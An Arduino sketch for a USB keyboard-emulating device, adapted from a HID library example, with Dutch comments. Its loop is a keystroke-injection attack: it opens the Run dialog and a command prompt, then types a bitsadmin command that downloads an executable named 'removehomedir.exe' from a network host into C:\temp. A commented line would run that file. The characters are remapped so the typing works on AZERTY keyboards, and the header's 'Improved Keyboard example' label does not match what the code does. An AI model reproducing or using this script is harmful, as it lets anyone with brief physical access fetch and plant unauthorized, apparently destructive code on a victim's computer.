/*
  Copyright (c) 2014-2015 NicoHood
  See the readme for credit to other people.
  Improved Keyboard example
  Shows how to use the new Keyboard API.
  See HID Project documentation for more information.
  https://github.com/NicoHood/HID/wiki/Keyboard-API#improved-keyboard3cmd
*/

#include "HID-Project.h"

const int pinLed = LED_BUILTIN;
const int pinButton = 2;

void setup() 
{
  pinMode(pinLed, OUTPUT);
  digitalWrite(pinLed, LOW);

  // Sends a clean report to the host. This is important on any Arduino type.
  Keyboard.begin();
}


void loop() 
{
  // Trigger caps lock manually via button
  if (!digitalRead(pinButton)) {

    //download via windows standaard programma
    //bitsadmin  /transfer mydownloadjob  /download  /priority normal  http://cdimage.debian.org/debian-cd/8.3.0/i386/iso-cd/debian-8.3.0-i386-netinst.iso  C:\Users\arno\Desktop\debian.zip
    //geen idee waarom dit zo'n rare layout is maar dit is de match
    //<wxcvbn,;:=     => .zxcvbn;mm-
    //azertyuiop^$    => qwertyuiop64
    //qsdfghjklmùµ    => asdfghjkl,
    //wxcvbn,;:=      => zxcvbn;mm-
    
    //show the world we started
    digitalWrite(pinLed, HIGH);
    
    //druk WIN-r om nieuw 'uitvoeren venster te gebruiken'
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(300);
    Keyboard.releaseAll();

    //open firefox met guideline.be
    Keyboard.println("firefox zzz<guideline<be ");
    delay(500);

    //druk WIN-r om nieuw 'uitvoeren venster te gebruiken'
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(300);
    Keyboard.releaseAll();

    //print "cmd" om dos venter te openen
    Keyboard.println("c;d");
    delay(300);

    //druk WIN-arrow-up om dos venster te maximaliseren
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_UP_ARROW );
    delay(300);
    Keyboard.releaseAll();
    
    Keyboard.print("bitsqd;in  ");
    Keyboard.print("/trqnsfer ");
    Keyboard.print("qqq  ");
    Keyboard.print("/doznloqd  ");
    Keyboard.print("/priority nor;ql ");
    Keyboard.print("http.");
    Keyboard.write(KeyboardKeycode(47)); // slash
    Keyboard.write(KeyboardKeycode(47)); // slash
    Keyboard.write(KeyboardKeycode(49)); // 1
    Keyboard.write(KeyboardKeycode(57)); // 9
    Keyboard.write(KeyboardKeycode(50)); // 2
    Keyboard.write(KeyboardKeycode(47)); // slash
    Keyboard.print("Qrduino");
    Keyboard.write(KeyboardKeycode(47)); // slash
    Keyboard.print("hid");
    Keyboard.write(KeyboardKeycode(47)); // slash
    Keyboard.print("re;oveho;edir<exe  ");
    Keyboard.print("C.\\te;p\\re;oveho;edir<exe");
    //delay(3000);
    //Keyboard.println("C.\\te;p\\re;oveho;edir<exe");
    
    //Keyboard.println("php =i");
    //delay(2000);

    // Simple debounce
    delay(3000000);
    digitalWrite(pinLed, LOW);
  }
}
